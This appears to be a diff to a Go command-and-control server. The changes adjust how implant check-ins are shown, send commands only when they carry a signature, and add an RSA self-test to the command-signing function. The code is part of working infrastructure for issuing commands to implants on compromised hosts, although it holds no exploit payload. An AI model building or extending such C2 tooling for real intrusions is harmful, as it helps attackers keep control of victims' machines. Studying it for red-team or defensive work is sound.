@@ -152,8 +152,10 @@ func UUID_info_func(UUID string) (impInfoStruct, error) {
 		// This lets us know when a new implant checks in for the first time
 		fmt.Printf("\033[s")      // save  cursor position
 		fmt.Printf("\033[%dA", 2) // move up 2
-		fmt.Printf("\nNew implant check-in at %s from %s \n", currentTimeStr, UUID)
-		fmt.Printf("\033[u") // undo the move down
+		fmt.Println()
+		fmt.Printf("\033[1m  New implant check-in at %s from %s", currentTimeStr, UUID)
+		fmt.Printf("\033[u") // undo the move up
+		fmt.Printf("\033[0m")
 		_, err := c2.SendUpdate(sig_ctx, &pb.UpdateObject{UUID: UUID, Whoami: "", Signature: preserved_sig,
 			Retrieved: 0, Command: preserved_command, LastCheckIn: currentTimeStr, Result: preserved_result,
 			GotIt: 1})
@@ -213,8 +215,10 @@ func EnableServers(address, port string) (string, error) {
 
 		//fmt.Printf("Signature: %s, Command %s \n", res.Signature, res.Command)
 		if err == nil {
-			w.Header().Set("Verifier", res.Signature)
-			fmt.Fprintln(w, res.Command)
+			if res.Signature != "" {
+				w.Header().Set("Verifier", res.Signature)
+				fmt.Fprintln(w, res.Command)
+			}
 		}
 
 	})
@@ -297,21 +301,37 @@ func startListener(address, port string) (string, error) {
 }
 
 func sign(command string) (string, error) {
-	KeyPEM, _ := os.ReadFile("global.pem")
+	command_bytes := []byte(command)
+	KeyPEM, err := os.ReadFile("global.pem")
+	if err != nil {
+		fmt.Println(err)
+	}
+	PublicKey, err := os.ReadFile("global.pub.pem")
+	if err != nil {
+		fmt.Println(err)
+	}
 
 	PEMBlock, _ := pem.Decode([]byte(KeyPEM))
+	PubPEMBlock, _ := pem.Decode([]byte(PublicKey))
+
 	if PEMBlock == nil {
 		err := errors.New("could not parse private key pem")
 		return "", err
 	}
 
-	key, _ := x509.ParsePKCS1PrivateKey(PEMBlock.Bytes)
+	Pkey, err := x509.ParsePKIXPublicKey(PubPEMBlock.Bytes)
+	if err != nil {
+		fmt.Println(err)
+	}
 
-	toSign := []byte(command)
-	hashed := sha256.Sum256(toSign)
+	key, err := x509.ParsePKCS1PrivateKey(PEMBlock.Bytes)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	hashed := sha256.Sum256(command_bytes)
 
 	byte_sig, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, hashed[:])
-	// We need to b64 encode this sig now
 
 	if err != nil {
 		return "", err
@@ -319,7 +339,22 @@ func sign(command string) (string, error) {
 
 	sig := base64.StdEncoding.EncodeToString(byte_sig)
 
-	return sig, nil
+	/*==========================================*/
+	/*==========Test the message================*/
+
+	hash_test := sha256.Sum256(command_bytes)
+
+	signature_bytes, err := base64.StdEncoding.DecodeString(sig)
+
+	err = rsa.VerifyPKCS1v15(Pkey.(*rsa.PublicKey), crypto.SHA256, hash_test[:], signature_bytes)
+
+	if err != nil {
+		fmt.Printf("Verification failed %e\n", err)
+		return "", err
+	} else {
+		fmt.Println("Testing passed")
+		return sig, nil
+	}
 
 }
 
@@ -666,6 +701,7 @@ func main() {
 						if err != nil {
 							fmt.Print(err)
 						}
+						fmt.Printf("Signing command with %s \n", sig)
 						res, err := set(cmd, uuid, sig)
 						if res != 0 || err != nil {
 							fmt.Print(err)
@@ -707,7 +743,7 @@ func main() {
 				if key != "yes" {
 					break
 				} else {
-					_, _ = remKey(key)
+					_, _ = remKey("UUID")
 				}
 
 			case input == "help":
